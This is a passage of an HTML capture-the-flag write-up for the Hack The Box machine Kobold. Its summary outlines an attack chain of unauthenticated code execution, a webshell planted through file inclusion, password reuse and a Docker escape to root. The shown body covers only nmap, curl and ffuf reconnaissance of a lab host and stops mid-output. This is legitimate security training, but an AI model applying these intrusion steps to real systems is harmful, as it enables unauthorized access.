@@ -1,0 +1,1554 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta name="name" content="HTB: Kobold">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB: Kobold | 0xdf hacks stuff</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="HTB: Kobold" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Kobold hosts several services behind an Nginx reverse proxy, including an MCPJam inspector instance, a PrivateBin paste site, and an Arcane Docker management panel. I’ll exploit an unauthenticated remote code execution vulnerability in MCPJam that stems from it binding to all interfaces and installing an attacker-controlled MCP server, getting a shell. From there I’ll abuse a local file inclusion in PrivateBin’s template-selection feature, writing a PHP webshell into a host directory that is mounted into the PrivateBin container to get execution inside it. The container’s configuration leaks a database password that I’ll reuse to log into Arcane. With control over the Docker panel, I’ll create a container that mounts the host filesystem, drop an SSH key for root, and log in to take over the box." />
+<meta property="og:description" content="Kobold hosts several services behind an Nginx reverse proxy, including an MCPJam inspector instance, a PrivateBin paste site, and an Arcane Docker management panel. I’ll exploit an unauthenticated remote code execution vulnerability in MCPJam that stems from it binding to all interfaces and installing an attacker-controlled MCP server, getting a shell. From there I’ll abuse a local file inclusion in PrivateBin’s template-selection feature, writing a PHP webshell into a host directory that is mounted into the PrivateBin container to get execution inside it. The container’s configuration leaks a database password that I’ll reuse to log into Arcane. With control over the Docker panel, I’ll create a container that mounts the host filesystem, drop an SSH key for root, and log in to take over the box." />
+<link rel="canonical" href="https://0xdf.gitlab.io/2026/08/01/htb-kobold.html" />
+<meta property="og:url" content="https://0xdf.gitlab.io/2026/08/01/htb-kobold.html" />
+<meta property="og:site_name" content="0xdf hacks stuff" />
+<meta property="og:image" content="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/kobold-cover.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-08-01T13:45:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:image" content="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/kobold-cover.png" />
+<meta property="twitter:title" content="HTB: Kobold" />
+<meta name="twitter:site" content="@0xdf_" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-08-01T13:45:00+00:00","datePublished":"2026-08-01T13:45:00+00:00","description":"Kobold hosts several services behind an Nginx reverse proxy, including an MCPJam inspector instance, a PrivateBin paste site, and an Arcane Docker management panel. I’ll exploit an unauthenticated remote code execution vulnerability in MCPJam that stems from it binding to all interfaces and installing an attacker-controlled MCP server, getting a shell. From there I’ll abuse a local file inclusion in PrivateBin’s template-selection feature, writing a PHP webshell into a host directory that is mounted into the PrivateBin container to get execution inside it. The container’s configuration leaks a database password that I’ll reuse to log into Arcane. With control over the Docker panel, I’ll create a container that mounts the host filesystem, drop an SSH key for root, and log in to take over the box.","headline":"HTB: Kobold","image":"https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/kobold-cover.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xdf.gitlab.io/2026/08/01/htb-kobold.html"},"url":"https://0xdf.gitlab.io/2026/08/01/htb-kobold.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/bootstrap-toc.min.css">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <link rel="stylesheet" href="/assets/css/custom.css"> 
+  <link rel="stylesheet" href="/assets/css/buymeacoffee.css">
+  
+  <link rel="stylesheet" href="/assets/css/syntax.css">
+  
+<link type="application/atom+xml" rel="alternate" href="https://0xdf.gitlab.io/feed.xml" title="0xdf hacks stuff" /><!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-P056MVQVGM"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-P056MVQVGM');
+</script>
+<!--<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-120216868-1', 'auto');
+ga('send', 'pageview');
+</script>-->
+  
+<link rel="icon" type="image/png" href="/assets/icons/favicon-32x32.png" sizes="32x32" />
+  <link rel="icon" type="image/png" href="/assets/icons/favicon-16x16.png" sizes="16x16" />
+  
+  <link rel="stylesheet" href="/assets/css/links.css">
+  
+</head>
+
+  <body data-spy="scroll" data-toggle="toc" data-offset="150">
+  
+<header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">0xdf hacks stuff</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger">
+            <a class="page-link-site" href="/">Home</a><a class="page-link-site" href="/about">About Me</a><a class="page-link-site" href="/tags">Tags</a><a class="page-link-site" href="/cheatsheets/">Cheatsheets</a><a class="page-link-site bmc" href="https://youtube.com/@0xdf" target="_blank"><img src="/icons/youtube.png" class="svg-icon" alt="" />YouTube</a>
+          <a class="page-link-site bmc" href="https://gitlab.com/0xdf/ctfscripts" target="_blank"><img src="/icons/gitlab.png" class="svg-icon" alt="" />Gitlab</a><a class="page-link-site bmc" href="/feed.xml"><img src="/icons/rss.png" class="svg-icon" alt="" /><span>feed</span></a><a class="page-link-site bmc" target="_blank"
+href="https://www.buymeacoffee.com/0xdf"><img src="https://cdn.buymeacoffee.com/buttons/bmc-new-btn-logo.svg" alt="Buy me a coffee" style="-webkit-filter: drop-shadow(0px 0px 2px white); filter: drop-shadow(0px 0px 2px white);"></a>
+        </div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HTB: Kobold</h1>
+    <p class="post-meta">
+
+<span class="tag-list"><a href="/tags#hackthebox" class="post-tag">hackthebox</a> <a href="/tags#ctf" class="post-tag">ctf</a> <a href="/tags#htb-kobold" class="post-tag">htb-kobold</a> <a href="/tags#nmap" class="post-tag">nmap</a> <a href="/tags#ubuntu" class="post-tag">ubuntu</a> <a href="/tags#subdomain" class="post-tag">subdomain</a> <a href="/tags#ffuf" class="post-tag">ffuf</a> <a href="/tags#feroxbuster" class="post-tag">feroxbuster</a> <a href="/tags#privatebin" class="post-tag">privatebin</a> <a href="/tags#mcpjam" class="post-tag">mcpjam</a> <a href="/tags#arcane" class="post-tag">arcane</a> <a href="/tags#cve-2026-23744" class="post-tag">cve-2026-23744</a> <a href="/tags#docker" class="post-tag">docker</a> <a href="/tags#container" class="post-tag">container</a> <a href="/tags#cve-2025-64714" class="post-tag">cve-2025-64714</a> <a href="/tags#php" class="post-tag">php</a> <a href="/tags#lfi" class="post-tag">lfi</a> <a href="/tags#webshell" class="post-tag">webshell</a> <a href="/tags#shared-credentials" class="post-tag">shared-credentials</a> <a href="/tags#password-reuse" class="post-tag">password-reuse</a> </span><br/><br/>
+
+
+<time class="dt-published" datetime="2026-08-01T13:45:00+00:00" itemprop="datePublished">Aug 1, 2026
+      </time></p>
+
+  </header>
+
+  
+  <!-- Mobile TOC toggle button -->
+  <button class="toc-toggle" onclick="document.body.classList.add('toc-open')" aria-label="Open table of contents">
+    TOC
+  </button>
+
+  <!-- Mobile TOC drawer -->
+  <div class="toc-drawer">
+    <p><a href="/2026/08/01/htb-kobold.html" style="color: #e6e6e6; text-decoration: none;">HTB: Kobold</a></p>
+    <nav id="toc-mobile" data-toggle="toc" onclick="if(event.target.tagName==='A')document.body.classList.remove('toc-open')"></nav>
+  </div>
+
+  <!-- Overlay for mobile drawer -->
+  <div class="toc-overlay" onclick="document.body.classList.remove('toc-open')"></div>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <div class="row">
+      <div class="col-sm-3">
+        <div class="sticky-top">
+		<p><a href="/2026/08/01/htb-kobold.html" style="color: #e6e6e6; text-decoration: none;">HTB: Kobold</a></p>
+	    <!--https://afeld.github.io/bootstrap-toc/-->
+          <nav id="toc" data-toggle="toc"></nav>
+        </div>
+      </div>
+      <div class="col-sm-9" id="postBody">
+        <picture>
+    <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/kobold-cover.webp" />
+    <img loading="lazy" src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/kobold-cover.png" alt="Kobold" style="float: right; margin-right:50px; margin-left:50px; height:150px;" class="include_image " />
+</picture>
+<p>Kobold hosts several services behind an Nginx reverse proxy, including an MCPJam inspector instance, a PrivateBin paste site, and an Arcane Docker management panel. I’ll exploit an unauthenticated remote code execution vulnerability in MCPJam that stems from it binding to all interfaces and installing an attacker-controlled MCP server, getting a shell. From there I’ll abuse a local file inclusion in PrivateBin’s template-selection feature, writing a PHP webshell into a host directory that is mounted into the PrivateBin container to get execution inside it. The container’s configuration leaks a database password that I’ll reuse to log into Arcane. With control over the Docker panel, I’ll create a container that mounts the host filesystem, drop an SSH key for root, and log in to take over the box.</p>
+
+<h2 id="box-info">Box Info</h2>
+
+<!-- https://app.hackthebox.com/machines/856 -->
+
+<div class="htb-card platform-htb">
+  <div class="htb-card-header">
+    <div class="htb-box-info">
+      <a href="https://hackthebox.com/machines/kobold" target="_blank" class="htb-box-icon">
+        <picture>
+          <source type="image/webp" srcset="/icons/box-kobold.webp" />
+          <img src="/icons/box-kobold.png" alt="Kobold" />
+        </picture>
+      </a>
+      <div class="htb-box-title">
+        <a href="https://hackthebox.com/machines/kobold" target="_blank" class="htb-box-name">Kobold</a>
+      </div>
+    </div><div class="htb-difficulty-badge diff-Easy">
+      Easy
+    </div>
+  </div>
+
+  <div class="htb-card-body">
+    <div class="htb-meta-grid">
+      <div class="htb-meta-item">
+        <span class="htb-meta-label">Release Date</span>
+        <span class="htb-meta-value">
+          
+          <a href="https://twitter.com/hackthebox_eu/status/2034615958912864460">21 Mar 2026</a>
+        </span>
+      </div>
+      
+      <div class="htb-meta-item">
+        <span class="htb-meta-label">Retire Date</span>
+        <span class="htb-meta-value">01 Aug 2026</span>
+      </div>
+      
+      <div class="htb-meta-item">
+        <span class="htb-meta-label">OS</span>
+        <span class="htb-meta-value htb-os">
+          <picture><source type="image/webp" srcset="/icons/Linux.webp" /><img src="/icons/Linux.png" alt="Linux" /></picture>
+          Linux
+        </span>
+      </div>
+    </div>
+
+    <div class="htb-cards">
+      
+      <div class="htb-card-row htb-card-green">
+        <span class="htb-card-label">Rated Difficulty</span>
+        <picture>
+          <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/kobold-diff.webp" />
+          <img src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/kobold-diff.png" alt="Rated difficulty for Kobold" class="htb-diff-img" />
+        </picture>
+      </div>
+      <div class="htb-card-row htb-card-green htb-card-tall">
+        <span class="htb-card-label">Radar Graph</span>
+        <picture>
+          <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/kobold-radar.webp" />
+          <img src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/kobold-radar.png" alt="Radar chart for Kobold" class="htb-radar-img" />
+        </picture>
+      </div>
+      
+      
+      <div class="htb-card-row htb-card-red">
+        <div class="htb-blood-chip">
+          <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.17728 1.8663C9.39181 1.53976 9.75455 1.36377 10.1194 1.36377C10.4845 1.36377 10.8474 1.53992 11.0619 1.86677C11.2785 2.19751 11.5887 2.67967 11.9582 3.25725C12.1814 3.60619 12.0794 4.07 11.7305 4.29319C11.3816 4.51638 10.9178 4.41445 10.6946 4.06551C10.479 3.72853 10.285 3.42614 10.1186 3.16844C9.45753 4.18835 8.37959 5.89633 7.40828 7.656C6.83514 8.69432 6.30663 9.73721 5.92344 10.6594C5.52883 11.609 5.32959 12.3362 5.32959 12.7789C5.32959 15.1536 7.4206 17.172 10.1194 17.172C11.6175 17.172 12.9428 16.5425 13.8158 15.5721C14.0929 15.2641 14.5671 15.239 14.875 15.5161C15.183 15.7931 15.208 16.2673 14.931 16.5753C13.7716 17.8641 12.0399 18.672 10.1194 18.672C6.69911 18.672 3.82959 16.0851 3.82959 12.7789C3.82959 12.0155 4.13669 11.0502 4.53827 10.0838C4.95126 9.08991 5.50879 7.99321 6.09505 6.93112C7.26832 4.80557 8.58701 2.76434 9.17728 1.8663Z" fill="currentColor" /><path d="M12.4256 10.0001C11.9254 10.0001 11.5003 9.81776 11.1502 9.45318C10.8 9.0886 10.625 8.64589 10.625 8.12505C10.625 7.60422 10.8 7.16151 11.1502 6.79693C11.5003 6.43235 11.9254 6.25005 12.4256 6.25005C12.9257 6.25005 13.3509 6.43235 13.701 6.79693C14.0511 7.16151 14.2262 7.60422 14.2262 8.12505C14.2262 8.64589 14.0511 9.0886 13.701 9.45318C13.3509 9.81776 12.9257 10.0001 12.4256 10.0001Z" fill="currentColor" /><path d="M8.82438 12.8126V12.5001C8.82438 12.3004 8.87648 12.1116 8.98068 11.9336C9.08488 11.7557 9.22868 11.606 9.41208 11.4844C9.87056 11.2067 10.3553 10.994 10.8662 10.8464C11.3772 10.6988 11.8961 10.6251 12.423 10.6251C12.9499 10.6251 13.4697 10.6988 13.9823 10.8464C14.495 10.994 14.9806 11.2067 15.4391 11.4844C15.6225 11.5973 15.7663 11.7448 15.8705 11.9271C15.9747 12.1094 16.0268 12.3004 16.0268 12.5001V12.8126C16.0268 13.0704 15.9386 13.2911 15.7622 13.4747C15.5857 13.6583 15.3737 13.7501 15.126 13.7501H9.72114C9.47342 13.7501 9.26203 13.6583 9.08697 13.4747C8.91191 13.2911 8.82438 13.0704 8.82438 12.8126Z" fill="currentColor" /></svg>
+          <span class="htb-blood-label">User</span>
+        </div>
+        <div class="htb-blood-info">
+          <span class="htb-blood-time"><span class="htb-blood-clock">00:08:25</span></span><a href="https://app.hackthebox.com/users/76106" target="_blank" rel="noopener"><img alt="JaxT" src="https://www.hackthebox.com/badge/image/76106" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> JaxT</span></a><br /></div>
+      </div>
+      <div class="htb-card-row htb-card-red">
+        <div class="htb-blood-chip">
+          <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.17728 1.8663C9.39181 1.53976 9.75455 1.36377 10.1194 1.36377C10.4845 1.36377 10.8474 1.53992 11.0619 1.86677C11.2785 2.19751 11.5887 2.67967 11.9582 3.25725C12.1814 3.60619 12.0794 4.07 11.7305 4.29319C11.3816 4.51638 10.9178 4.41445 10.6946 4.06551C10.479 3.72853 10.285 3.42614 10.1186 3.16844C9.45753 4.18835 8.37959 5.89633 7.40828 7.656C6.83514 8.69432 6.30663 9.73721 5.92344 10.6594C5.52883 11.609 5.32959 12.3362 5.32959 12.7789C5.32959 15.1536 7.4206 17.172 10.1194 17.172C11.6175 17.172 12.9428 16.5425 13.8158 15.5721C14.0929 15.2641 14.5671 15.239 14.875 15.5161C15.183 15.7931 15.208 16.2673 14.931 16.5753C13.7716 17.8641 12.0399 18.672 10.1194 18.672C6.69911 18.672 3.82959 16.0851 3.82959 12.7789C3.82959 12.0155 4.13669 11.0502 4.53827 10.0838C4.95126 9.08991 5.50879 7.99321 6.09505 6.93112C7.26832 4.80557 8.58701 2.76434 9.17728 1.8663Z" fill="currentColor" /><path d="M10.7 13.5H9.3V12.1H10.7V13.5ZM10.7 10.7H9.3V6.5H10.7V10.7Z" fill="currentColor" /></svg>
+          <span class="htb-blood-label">Root</span>
+        </div>
+        <div class="htb-blood-info">
+          <span class="htb-blood-time"><span class="htb-blood-clock">00:30:52</span></span><a href="https://app.hackthebox.com/users/76106" target="_blank" rel="noopener"><img alt="JaxT" src="https://www.hackthebox.com/badge/image/76106" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> JaxT</span></a><br /></div>
+      </div>
+      
+      <div class="htb-card-row htb-card-blue">
+        <span class="htb-card-label">Creator</span>
+        
+<a href="https://app.hackthebox.com/users/201596" target="_blank" rel="noopener"><img alt="sau123" src="https://www.hackthebox.com/badge/image/201596" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> sau123</span></a><br />
+      </div>
+    </div>
+
+    
+  </div>
+</div>
+<h2 id="recon">Recon</h2>
+
+<h3 id="initial-scanning">Initial Scanning</h3>
+
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds four open TCP ports, SSH (22), HTTP (80, 3552), and HTTPS (443):</p>
+
+<div class="language-console code-collapse highlighter-rouge" data-trunc="1500"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--reason</span> <span class="nt">--min-rate</span> 10000 10.129.245.50
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-22 00:35 UTC
+Nmap scan report for 10.129.245.50
+Host is up, received echo-reply ttl 63 (0.049s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT     STATE SERVICE  REASON
+22/tcp   open  ssh      syn-ack ttl 63
+80/tcp   open  http     syn-ack ttl 63
+443/tcp  open  https    syn-ack ttl 63
+3552/tcp open  taserver syn-ack ttl 63
+
+Nmap done: 1 IP address (1 host up) scanned in 8.33 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-p</span> 22,80,443,3552 <span class="nt">-sCV</span> 10.129.245.50
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-22 00:37 UTC
+Nmap scan report for 10.129.245.50
+Host is up (0.021s latency).
+
+PORT     STATE SERVICE   VERSION
+22/tcp   open  ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
+|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
+80/tcp   open  http      nginx 1.24.0 (Ubuntu)
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to https://kobold.htb/
+443/tcp  open  ssl/http  nginx 1.24.0 (Ubuntu)
+| tls-alpn:
+|   http/1.1
+|   http/1.0
+|_  http/0.9
+|_http-title: Did not follow redirect to https://kobold.htb/
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+| ssl-cert: Subject: commonName=kobold.htb
+| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
+| Not valid before: 2026-03-15T15:08:55
+|_Not valid after:  2125-02-19T15:08:55
+|_ssl-date: TLS randomness does not represent time
+3552/tcp open  taserver?
+| fingerprint-strings:
+|   GenericLines:
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest, HTTPOptions:
+|     HTTP/1.0 200 OK
+|     Accept-Ranges: bytes
+|     Cache-Control: no-cache, no-store, must-revalidate
+|     Content-Length: 2081
+|     Content-Type: text/html; charset=utf-8
+|     Expires: 0
+|     Pragma: no-cache
+|     Date: Tue, 21 Jul 2026 17:37:16 GMT
+|     &lt;!doctype html&gt;
+|     &lt;html lang="%lang%"&gt;
+|     &lt;head&gt;
+|     &lt;meta charset="utf-8" /&gt;
+|     &lt;meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" /&gt;
+|     &lt;meta http-equiv="Pragma" content="no-cache" /&gt;
+|     &lt;meta http-equiv="Expires" content="0" /&gt;
+|     &lt;link rel="icon" href="/api/app-images/favicon" /&gt;
+|     &lt;meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover" /&gt;
+|     &lt;link rel="manifest" href="/app.webmanifest" /&gt;
+|     &lt;meta name="theme-color" content="oklch(1 0 0)" media="(prefers-color-scheme: light)" /&gt;
+|     &lt;meta name="theme-color" content="oklch(0.141 0.005 285.823)" media="(prefers-color-scheme: dark)" /&gt;
+|_    &lt;link rel="modu
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3552-TCP:V=7.94SVN%I=7%D=7/22%Time=6A6010BE%P=x86_64-pc-linux-gnu%r
+SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
+SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
+SF:d\x20Request")%r(GetRequest,8FF,"HTTP/1\.0\x20200\x20OK\r\nAccept-Range
+SF:s:\x20bytes\r\nCache-Control:\x20no-cache,\x20no-store,\x20must-revalid
+SF:ate\r\nContent-Length:\x202081\r\nContent-Type:\x20text/html;\x20charse
+SF:t=utf-8\r\nExpires:\x200\r\nPragma:\x20no-cache\r\nDate:\x20Tue,\x2021\
+SF:x20Jul\x202026\x2017:37:16\x20GMT\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20l
+SF:ang=\"%lang%\"&gt;\n\t&lt;head&gt;\n\t\t&lt;meta\x20charset=\"utf-8\"\x20/&gt;\n\t\t&lt;m
+SF:eta\x20http-equiv=\"Cache-Control\"\x20content=\"no-cache,\x20no-store,
+SF:\x20must-revalidate\"\x20/&gt;\n\t\t&lt;meta\x20http-equiv=\"Pragma\"\x20cont
+SF:ent=\"no-cache\"\x20/&gt;\n\t\t&lt;meta\x20http-equiv=\"Expires\"\x20content=
+SF:\"0\"\x20/&gt;\n\t\t&lt;link\x20rel=\"icon\"\x20href=\"/api/app-images/favico
+SF:n\"\x20/&gt;\n\t\t&lt;meta\x20name=\"viewport\"\x20content=\"width=device-wid
+SF:th,\x20initial-scale=1,\x20maximum-scale=1,\x20viewport-fit=cover\"\x20
+SF:/&gt;\n\t\t&lt;link\x20rel=\"manifest\"\x20href=\"/app\.webmanifest\"\x20/&gt;\n
+SF:\t\t&lt;meta\x20name=\"theme-color\"\x20content=\"oklch\(1\x200\x200\)\"\x
+SF:20media=\"\(prefers-color-scheme:\x20light\)\"\x20/&gt;\n\t\t&lt;meta\x20name
+SF:=\"theme-color\"\x20content=\"oklch\(0\.141\x200\.005\x20285\.823\)\"\x
+SF:20media=\"\(prefers-color-scheme:\x20dark\)\"\x20/&gt;\n\t\t\n\t\t&lt;link\x2
+SF:0rel=\"modu")%r(HTTPOptions,8FF,"HTTP/1\.0\x20200\x20OK\r\nAccept-Range
+SF:s:\x20bytes\r\nCache-Control:\x20no-cache,\x20no-store,\x20must-revalid
+SF:ate\r\nContent-Length:\x202081\r\nContent-Type:\x20text/html;\x20charse
+SF:t=utf-8\r\nExpires:\x200\r\nPragma:\x20no-cache\r\nDate:\x20Tue,\x2021\
+SF:x20Jul\x202026\x2017:37:16\x20GMT\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20l
+SF:ang=\"%lang%\"&gt;\n\t&lt;head&gt;\n\t\t&lt;meta\x20charset=\"utf-8\"\x20/&gt;\n\t\t&lt;m
+SF:eta\x20http-equiv=\"Cache-Control\"\x20content=\"no-cache,\x20no-store,
+SF:\x20must-revalidate\"\x20/&gt;\n\t\t&lt;meta\x20http-equiv=\"Pragma\"\x20cont
+SF:ent=\"no-cache\"\x20/&gt;\n\t\t&lt;meta\x20http-equiv=\"Expires\"\x20content=
+SF:\"0\"\x20/&gt;\n\t\t&lt;link\x20rel=\"icon\"\x20href=\"/api/app-images/favico
+SF:n\"\x20/&gt;\n\t\t&lt;meta\x20name=\"viewport\"\x20content=\"width=device-wid
+SF:th,\x20initial-scale=1,\x20maximum-scale=1,\x20viewport-fit=cover\"\x20
+SF:/&gt;\n\t\t&lt;link\x20rel=\"manifest\"\x20href=\"/app\.webmanifest\"\x20/&gt;\n
+SF:\t\t&lt;meta\x20name=\"theme-color\"\x20content=\"oklch\(1\x200\x200\)\"\x
+SF:20media=\"\(prefers-color-scheme:\x20light\)\"\x20/&gt;\n\t\t&lt;meta\x20name
+SF:=\"theme-color\"\x20content=\"oklch\(0\.141\x200\.005\x20285\.823\)\"\x
+SF:20media=\"\(prefers-color-scheme:\x20dark\)\"\x20/&gt;\n\t\t\n\t\t&lt;link\x2
+SF:0rel=\"modu");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 89.51 seconds
+</span></code></pre></div></div>
+
+<p>Based on the <a href="/cheatsheets/os#ubuntu">OpenSSH and Nginx</a> versions, the host is likely running Ubuntu 24.04 Noble LTS.</p>
+
+<p>All of the ports show a TTL of 63, which matches the <a href="/cheatsheets/os#os-identification">expected TTL</a> for Linux one hop away.</p>
+
+<h3 id="subdomains">Subdomains</h3>
+
+<p>There’s a redirect to <code class="language-plaintext highlighter-rouge">kobold.htb</code> on port 80 and 443, both to HTTPS. I’ll use <code class="language-plaintext highlighter-rouge">ffuf</code> to bruteforce for subdomains that respond differently.</p>
+
+<p>On port HTTP I don’t expect to find anything. A common pattern is to have every request on HTTP just redirect to the same path on HTTPS. On Kobold, it seems to redirect to HTTPS <code class="language-plaintext highlighter-rouge">kobold.htb</code> for any host, keeping the path the same:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://10.129.245.50 <span class="nt">-I</span>
+<span class="go">HTTP/1.1 301 Moved Permanently
+Server: nginx/1.24.0 (Ubuntu)
+Date: Thu, 23 Jul 2026 12:29:49 GMT
+Content-Type: text/html
+Content-Length: 178
+Connection: keep-alive
+Location: https://kobold.htb/
+
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://10.129.245.50/test <span class="nt">-I</span>
+<span class="go">HTTP/1.1 301 Moved Permanently
+Server: nginx/1.24.0 (Ubuntu)
+Date: Thu, 23 Jul 2026 12:29:53 GMT
+Content-Type: text/html
+Content-Length: 178
+Connection: keep-alive
+Location: https://kobold.htb/test
+
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://10.129.245.50/test <span class="nt">-H</span> <span class="s2">"Host: test.test.test"</span> <span class="nt">-I</span>
+<span class="go">HTTP/1.1 301 Moved Permanently
+Server: nginx/1.24.0 (Ubuntu)
+Date: Thu, 23 Jul 2026 12:30:10 GMT
+Content-Type: text/html
+Content-Length: 178
+Connection: keep-alive
+Location: https://kobold.htb/test
+
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://10.129.245.50 <span class="nt">-H</span> <span class="s2">"Host: 0xdf.kobold.htb"</span> <span class="nt">-I</span>
+<span class="go">HTTP/1.1 301 Moved Permanently
+Server: nginx/1.24.0 (Ubuntu)
+Date: Thu, 23 Jul 2026 12:31:48 GMT
+Content-Type: text/html
+Content-Length: 178
+Connection: keep-alive
+Location: https://kobold.htb/
+</span></code></pre></div></div>
+
+<p>It’s still worth a quick check with <code class="language-plaintext highlighter-rouge">ffuf</code>, though it doesn’t find anything:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ffuf <span class="nt">-u</span> http://10.129.245.50 <span class="nt">-H</span> <span class="s2">"Host: FUZZ.kobold.htb"</span> <span class="nt">-w</span> /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-ac</span>
+<span class="go">
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.129.245.50
+ :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
+ :: Header           : Host: FUZZ.kobold.htb
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
